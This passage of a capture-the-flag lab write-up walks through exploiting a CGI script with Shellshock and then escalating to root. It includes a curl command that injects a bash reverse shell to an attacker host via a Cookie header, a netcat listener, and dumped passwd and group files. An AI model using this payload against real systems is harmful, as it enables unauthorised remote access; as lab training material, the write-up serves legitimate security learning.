+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -H <span style="color:#e6db74">&#39;Cookie: () { :;}; /bin/bash -i &gt;&amp; /dev/tcp/10.6.50.164/4444 0&gt;&amp;1&#39;</span> http://10.10.63.19/cgi-bin/test.cgi
+</span></span></code></pre></div><p>Before I send that, I will start a listener on port 4444:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo rlwrap nc -lvnp <span style="color:#ae81ff">4444</span>
+</span></span></code></pre></div><p><img src="/posts/0day-thm-5.png" alt="alt 3">
+<img src="https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Ftse1.mm.bing.net%2Fth%3Fid%3DOIP._x1N6mn_0EHDDSMri0a79wHaEK%26pid%3DApi&amp;f=1&amp;ipt=4b48a5164472739d7c6d14359ee0a019f3c2e1f2af7764844fc30387bc053066&amp;ipo=images" alt="great success"></p>
+<p>We can now grab <code>user.txt</code> and move forward with post exploitation enumeration to try and get root privileges</p>
+<h3 id="local-enumeration-for-privilege-escalation">Local enumeration for privilege escalation</h3>
+<p><strong>Kernel Information</strong></p>
+<p><strong>Users and groups</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root:x:0:0:root:/root:/bin/bash
+</span></span><span style="display:flex;"><span>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>bin:x:2:2:bin:/bin:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>sys:x:3:3:sys:/dev:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>sync:x:4:65534:sync:/bin:/bin/sync
+</span></span><span style="display:flex;"><span>games:x:5:60:games:/usr/games:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>gnats:x:41:41:Gnats Bug-Reporting System <span style="color:#f92672">(</span>admin<span style="color:#f92672">)</span>:/var/lib/gnats:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>libuuid:x:100:101::/var/lib/libuuid:
+</span></span><span style="display:flex;"><span>syslog:x:101:104::/home/syslog:/bin/false
+</span></span><span style="display:flex;"><span>messagebus:x:102:105::/var/run/dbus:/bin/false
+</span></span><span style="display:flex;"><span>ryan:x:1000:1000:Ubuntu 14.04.1,,,:/home/ryan:/bin/bash
+</span></span><span style="display:flex;"><span>sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin
+</span></span></code></pre></div><ul>
+<li>Notice the Ubuntu version: <code>ryan:x:1000:1000:Ubuntu 14.04.1,,,:/home/ryan:/bin/bash</code></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Groups:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>cat /etc/group
+</span></span><span style="display:flex;"><span>root:x:0:
+</span></span><span style="display:flex;"><span>daemon:x:1:
+</span></span><span style="display:flex;"><span>bin:x:2:
+</span></span><span style="display:flex;"><span>sys:x:3:
+</span></span><span style="display:flex;"><span>adm:x:4:syslog
+</span></span><span style="display:flex;"><span>tty:x:5:
+</span></span><span style="display:flex;"><span>disk:x:6:
+</span></span><span style="display:flex;"><span>lp:x:7:
+</span></span><span style="display:flex;"><span>mail:x:8:
+</span></span><span style="display:flex;"><span>news:x:9:
+</span></span><span style="display:flex;"><span>uucp:x:10:
+</span></span><span style="display:flex;"><span>man:x:12:
+</span></span><span style="display:flex;"><span>proxy:x:13:
+</span></span><span style="display:flex;"><span>kmem:x:15:
+</span></span><span style="display:flex;"><span>dialout:x:20:
+</span></span><span style="display:flex;"><span>fax:x:21:
+</span></span><span style="display:flex;"><span>voice:x:22:
+</span></span><span style="display:flex;"><span>cdrom:x:24:
+</span></span><span style="display:flex;"><span>floppy:x:25:
+</span></span><span style="display:flex;"><span>tape:x:26:
+</span></span><span style="display:flex;"><span>sudo:x:27:
+</span></span><span style="display:flex;"><span>audio:x:29:
+</span></span><span style="display:flex;"><span>dip:x:30:
+</span></span><span style="display:flex;"><span>www-data:x:33:
+</span></span><span style="display:flex;"><span>backup:x:34:
+</span></span><span style="display:flex;"><span>operator:x:37:
+</span></span><span style="display:flex;"><span>list:x:38:
+</span></span><span style="display:flex;"><span>irc:x:39:
+</span></span><span style="display:flex;"><span>src:x:40:
+</span></span><span style="display:flex;"><span>gnats:x:41:
+</span></span><span style="display:flex;"><span>shadow:x:42:
+</span></span><span style="display:flex;"><span>utmp:x:43:
+</span></span><span style="display:flex;"><span>video:x:44:
+</span></span><span style="display:flex;"><span>sasl:x:45:
+</span></span><span style="display:flex;"><span>plugdev:x:46:
+</span></span><span style="display:flex;"><span>staff:x:50:
+</span></span><span style="display:flex;"><span>games:x:60:
+</span></span><span style="display:flex;"><span>users:x:100:
+</span></span><span style="display:flex;"><span>nogroup:x:65534:
+</span></span><span style="display:flex;"><span>libuuid:x:101:
+</span></span><span style="display:flex;"><span>netdev:x:102:
+</span></span><span style="display:flex;"><span>crontab:x:103:
+</span></span><span style="display:flex;"><span>syslog:x:104:
+</span></span><span style="display:flex;"><span>messagebus:x:105:
+</span></span><span style="display:flex;"><span>fuse:x:106:
+</span></span><span style="display:flex;"><span>mlocate:x:107:
+</span></span><span style="display:flex;"><span>ssh:x:108:
+</span></span><span style="display:flex;"><span>ryan:x:1000:
+</span></span><span style="display:flex;"><span>lpadmin:x:109:
+</span></span><span style="display:flex;"><span>sambashare:x:110:
+</span></span><span style="display:flex;"><span>ssl-cert:x:111:
+</span></span></code></pre></div><p><strong>Os information</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>3.13.0-32-generic <span style="color:#75715e">#57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Ubuntu 14.0.1
+</span></span></code></pre></div><p>This version of ubuntu is really old, so I&rsquo;m fairly confident I can find an exploit somewhere to escalate privileges to root. Performing a quick google search <code>Ubuntu 14.0.1 privilege escalation exploit</code> brings us to a PoC for <a href="https://www.exploit-db.com/exploits/37292">CVE-2015-1328</a>.</p>
+<p>I then grabbed the correct PoC exploit code, pulled it over to the remote machine compiled it, ran it and boom. Got root!</p>
+<p><img src="/posts/0day-thm-4.png" alt="alt"></p>
+<p>Thanks for reading!</p>
+</div>
+    </article>
+  </main>
+
+      </div>
+      <footer>
+  <hr />
+  
+    <p id="social">
+      Find me around the web:
+      <br />
+      
+        
+        <a href="https://github.com/supaaasuge">GitHub</a>
+      
+         | 
+        <a href="https://x.com/supaaasuge">Twitter</a>
+      
+    </p>
+  
+  <p class="copyright">
+    Copyright © 2024
+    <a href="https://supaaasuge.github.io/"><strong>Supaaasuge</strong></a>.
+    This work is licensed under the
+    <a href="http://creativecommons.org/licenses/by-sa/4.0/">CC BY-SA 4.0</a> license.
+  </p>
+  <p class="builtWith">
+    Built with
+    <a href="http://www.gohugo.io/">Hugo</a>,
+    using the theme
+    <a href="https://gitlab.com/ian-s-mcb/smigle-hugo-theme">smigle</a>,
+    which was influenced by the theme
+    <a href="https://github.com/sumnerevans/smol">smol</a>.
+  </p>
+</footer>
+
+    </div>
+  </body>
+</html>
